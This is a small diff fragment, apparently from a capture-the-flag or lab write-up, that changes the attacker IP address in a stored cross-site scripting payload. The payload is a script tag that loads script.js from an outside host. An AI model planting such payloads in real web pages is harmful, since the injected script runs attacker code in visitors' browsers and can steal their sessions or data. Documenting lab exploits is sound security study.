@@ -6,7 +6,7 @@ XSS Used:
 
 ```text
 This is on the webpage
-<script src="http://10.10.14.28:81/script.js"></script>
+<script src="http://10.10.14.64/script.js"></script>
 ```
 
 ```text
